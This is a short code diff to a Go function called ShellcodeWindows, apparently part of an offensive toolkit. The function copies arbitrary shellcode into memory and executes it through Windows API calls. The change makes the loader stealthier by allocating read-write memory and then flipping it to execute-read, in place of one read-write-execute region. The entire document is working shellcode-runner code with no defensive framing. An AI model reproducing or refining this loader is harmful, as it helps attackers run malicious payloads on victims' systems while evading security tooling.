@@ -12,13 +12,17 @@ func ShellcodeWindows(sc []byte) error {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
 	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
 
 	const MEM_COMMIT = 0x1000
 	const MEM_RESERVE = 0x2000
-	const PAGE_EXECUTE_READWRITE = 0x40
-	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	const PAGE_READWRITE = 0x04
+	const PAGE_EXECUTE_READ = 0x20
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+	var oldperms uint32
+	VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldperms)))
 	syscall.Syscall(addr, 0, 0, 0, 0)
 
 	return nil
